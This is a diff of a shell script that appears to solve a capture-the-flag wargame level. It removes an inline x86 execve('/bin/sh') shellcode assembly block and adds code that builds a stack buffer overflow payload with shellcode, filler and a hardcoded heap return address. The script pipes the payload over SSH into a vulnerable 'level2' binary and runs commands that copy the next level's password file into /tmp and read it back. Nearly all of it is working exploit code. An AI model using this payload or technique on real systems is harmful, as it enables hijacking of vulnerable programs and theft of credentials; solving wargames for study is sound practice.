@@ -25,31 +25,12 @@ generate_exploit_shellcode() {
     trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
     tmpdir=$(mktemp -d);
 
-	cat <<-'EOF' > "$tmpdir/exploit.asm"
-		section .text
-		    global _start
-		_start:
-		    ; 1. Store "/bin/sh\0" in the stack.
-		    push 0x0068732f         ; Push "/sh\0"
-		    push 0x6e69622f         ; Push "/bin"
-		    ; 2. Setup execve::path parameter (EBX).
-		    mov ebx, esp            ; Make EBX point to "/bin/sh\0".
-		    ; 3. Setup execve::argv[] parameter (ECX).
-		    xor ecx, ecx            ; ECX = 0 (argv = NULL)
-		    ; 4. Setup execve::envp[] parameter (EDX).
-		    xor edx, edx            ; EDX = 0 (envp = NULL)
-		    ; 5. Execute sys_execve.
-		    xor eax, eax            ; Clear EAX first (EAX = 0)
-		    mov al, 0xb             ; EAX = 11
-		    int 0x80                ; Trigger the syscall through interrupt table.
-	EOF
-
-    nasm -f elf32 "$tmpdir/exploit.asm" -o "$tmpdir/exploit.o" || return 1;
+    nasm -f elf32 "$CURR_DIR_PATH/data/exploit.asm" -o "$tmpdir/exploit.o" || return 1;
     ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
     objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;
 
-    shellcode=$(hexdump -v -e '"\\x" 1/1 "%02x"' "$tmpdir/shellcode.bin");
-    echo "$shellcode";
+    shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
+    printf "%s" "$shellcode";
 
     rm -rf "$tmpdir";
     unset tmpdir shellcode;
@@ -65,12 +46,34 @@ main() {
 
     log "Authenticating to SSH server at $host:$port with username '$username' and password '$password'...";
 
-    sys_execve_shellcode=$(generate_exploit_shellcode);
-    echo "$sys_execve_shellcode";
-    exit 0;
+    # /!\ In dash `printf` doesn't support the `\xHH` format specifier. So we use octal instead of hexadecimal. /!\
+    # 1. Shell code.
+    octal_shellcode="$(generate_exploit_shellcode)";
+    octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
+    # 2. Stack local variables filler.
+    local_vars_byte_length=$((64 + 4 + 8)); # buffer (64 bytes) + ret_addr (4 bytes) + padding (8 bytes).
+    if [ "$octal_shellcode_byte_length" -gt "$local_vars_byte_length" ]; then
+        log "Error: shellcode is too long. It must be less than or equal to $local_vars_byte_length bytes, but it is $octal_shellcode_byte_length bytes.";
+        return 1;
+    fi
+    local_vars_filler_length=$((64 + 4 + 8 - octal_shellcode_byte_length)); # buffer (64 bytes) + ret_addr (4 bytes) + padding (8 bytes) - shellcode (octal_shellcode_byte_length bytes).
+    local_vars_filler="$(printf "x%.0s" $(seq "$local_vars_filler_length"))";
+    # 3. EBP filler.
+    ebp_filler="$(printf "b%.0s" $(seq 4))";
+    # 4. Return address to the shellcode in the heap.
+    heap_ptr_return_addr="\010\240\004\010"; # = 0x804a008 = 4 bytes.;
+    # 5. Setup the payload.
+    payload="${octal_shellcode}${local_vars_filler}${ebp_filler}${heap_ptr_return_addr}";
+
+    printf "Payload: %s\n" "$payload";
 
     ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; }
-    ssh_exec_via_socket "$host" "$port" "$username" "echo 'Hello World!'";
+    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
+    (
+        printf '%s' 'sleep 1;'; # Not viable but should workout.
+        printf '%s' 'cat '/home/user/level3/.pass' > /tmp/flag.txt;';
+    ) | ssh_exec_via_socket "$host" "$port" "$username" "(printf '%b' '$payload\n'; cat -) | ~/level2 >&2";
+    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
     ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; }
     
     if [ -z "$flag" ]; then
